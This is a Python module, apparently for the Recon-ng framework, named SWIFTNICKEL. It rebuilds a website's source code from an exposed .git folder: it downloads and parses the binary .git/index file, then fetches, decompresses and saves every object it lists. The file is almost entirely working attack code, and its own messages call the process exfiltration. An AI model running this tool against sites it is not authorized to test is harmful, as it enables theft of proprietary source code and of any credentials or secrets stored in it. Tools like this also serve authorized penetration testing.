from recon.core.module import BaseModule
import collections
import binascii
import urllib2
import struct
import mmap
import zlib
import sys
import os
import re

class Module(BaseModule):

    meta = {
    'name':'SWIFTNICKEL',
    'author':'gwaffles (https://twitter.com/gwaffles_)',
    'description':'Rebuilds the source code from an exposed .git folder network path.',
    'options':(
            ('url', None, True, 'Url to exfiltrate .git source code from.'),
            ('name', None, True, 'Project name of the .git source.')
        )
    }

    def module_run(self):
        url     = self.fix_git_url(self.options['url'])
        project = self.options['name']
        project_path_domain = url.replace('http://', '')
        project_path = os.path.join(os.path.expanduser('~/'), project_path_domain)

        if os.path.exists(project_path) is False:
            os.mkdir(project_path)

        gitfolder = os.path.join(project_path, project)

        if not url.endswith('.git/'):
            index = url + '.git' + '/index'

        data = self._request_data(index)

        if not data:
            self.error('%s is not accessible at this time.' % url)
            return

        elif data:

            if os.path.exists(gitfolder) is True:
                self.error('This source code has been exfiltrated before.')
                return

            elif os.path.exists(gitfolder) is False:
                os.mkdir(gitfolder)

            self.output('exfiltrating the \'%s\' git source code.' % project)

            idxpath = gitfolder + '/index'

            with open(idxpath, 'wb') as f:
                f.write(data)

            # Parse the index file and rebuild the source code.
            for entry in self.parse(idxpath):
                if 'sha1' in entry.keys():
                    filename = entry['name'].strip()
                    sha1     = entry["sha1"].strip()
                    self.download(url=url, path=gitfolder, sha1=sha1, filename=filename)
            self.output('exfiltration complete.')

    def fix_git_url(self, url):
        url = url.replace('https://', '')
        url = url.replace('http://', '')
        url = 'http://' + url
        url = url.replace('.git/', '')
        return url

    def _request_data(self, url):
        '''Return requested content is available return it.'''
        request = self.request(url)
        if request.status_code == 400 or request.status_code == 404:
            return False
        return request.raw

    def download(self, path, filename, sha1, url):
        '''Download the requested file to the exfiltrated data directory.'''

        if url.endswith('.git/'):
            folder = 'objects/%s/' % sha1[:2]
        elif url.endswith('.git'):
            folder = '/objects/%s/' % sha1[:2]
        else:
            folder = 'objects/%s/' % sha1[:2]

        data = self._request_data(url + folder + sha1[2:])

        # If the file still exists.
        if data:
            try:
                data = zlib.decompress(data)
            except:
                pass

            data = re.sub('blob \d+\00', '', data)
            target_dir = os.path.join(path, os.path.dirname(filename))

            # Make the dir
            if target_dir and not os.path.exists(target_dir):
                os.makedirs(target_dir)

            # Then make the file
            with open(os.path.join(path, filename) , 'wb') as f:
                f.write(data)

    def check(self, boolean, message):
        if not boolean:
            self.error(message)
            return

    def parse(self, path, pretty=True):
        '''Parse a /.git/index binary file.'''
        with open(path, 'rb') as fileobject:
            f = mmap.mmap(fileobject.fileno(), 0, access = mmap.ACCESS_READ)

            def read(format):
                # "All binary numbers are in network byte order."
                # Hence "!" = network order, big endian
                format = "! " + format
                bytes = f.read(struct.calcsize(format))
                return struct.unpack(format, bytes)[0]

            index = collections.OrderedDict()

            # 4-byte signature, b"DIRC"
            index["signature"] = f.read(4).decode("ascii")
            self.check(index["signature"] == "DIRC", "Not a Git index file")

            # 4-byte version number
            index["version"] = read("I")
            self.check(index["version"] in {2, 3},
                "Unsupported version: %s" % index["version"])

            # 32-bit number of index entries, i.e. 4-byte
            index["entries"] = read("I")

            yield index

            for n in range(index["entries"]):
                entry = collections.OrderedDict()

                entry["entry"] = n + 1

                entry["ctime_seconds"] = read("I")
                entry["ctime_nanoseconds"] = read("I")

                if pretty:
                    entry["ctime"] = entry["ctime_seconds"]
                    entry["ctime"] += entry["ctime_nanoseconds"] / 1000000000
                    del entry["ctime_seconds"]
                    del entry["ctime_nanoseconds"]

                entry["mtime_seconds"] = read("I")
                entry["mtime_nanoseconds"] = read("I")

                if pretty:
                    entry["mtime"] = entry["mtime_seconds"]
                    entry["mtime"] += entry["mtime_nanoseconds"] / 1000000000
                    del entry["mtime_seconds"]
                    del entry["mtime_nanoseconds"]

                entry["dev"] = read("I")
                entry["ino"] = read("I")

                # 4-bit object type, 3-bit unused, 9-bit unix permission
                entry["mode"] = read("I")

                if pretty:
                    entry["mode"] = "%06o" % entry["mode"]

                entry["uid"] = read("I")
                entry["gid"] = read("I")
                entry["size"] = read("I")

                entry["sha1"] = binascii.hexlify(f.read(20)).decode("ascii")
                entry["flags"] = read("H")

                # 1-bit assume-valid
                entry["assume-valid"] = bool(entry["flags"] & (0b10000000 << 8))
                # 1-bit extended, must be 0 in version 2
                entry["extended"] = bool(entry["flags"] & (0b01000000 << 8))
                # 2-bit stage (?)
                stage_one = bool(entry["flags"] & (0b00100000 << 8))
                stage_two = bool(entry["flags"] & (0b00010000 << 8))
                entry["stage"] = stage_one, stage_two
                # 12-bit name length, if the length is less than 0xFFF (else, 0xFFF)
                namelen = entry["flags"] & 0xFFF

                # 62 bytes so far
                entrylen = 62

                if entry["extended"] and (index["version"] == 3):
                    entry["extra-flags"] = read("H")
                    # 1-bit reserved
                    entry["reserved"] = bool(entry["extra-flags"] & (0b10000000 << 8))
                    # 1-bit skip-worktree
                    entry["skip-worktree"] = bool(entry["extra-flags"] & (0b01000000 << 8))
                    # 1-bit intent-to-add
                    entry["intent-to-add"] = bool(entry["extra-flags"] & (0b00100000 << 8))
                    # 13-bits unused
                    # used = entry["extra-flags"] & (0b11100000 << 8)
                    # check(not used, "Expected unused bits in extra-flags")
                    entrylen += 2

                if namelen < 0xFFF:
                    entry["name"] = f.read(namelen).decode("utf-8", "replace")
                    entrylen += namelen
                else:
                    # Do it the hard way
                    name = []
                    while True:
                        byte = f.read(1)
                        if byte == "\x00":
                            break
                        name.append(byte)
                    entry["name"] = b"".join(name).decode("utf-8", "replace")
                    entrylen += 1

                padlen = (8 - (entrylen % 8)) or 8
                nuls = f.read(padlen)
                self.check(set(nuls) == set(['\x00']), "padding contained non-NUL")
                yield entry

            f.close()
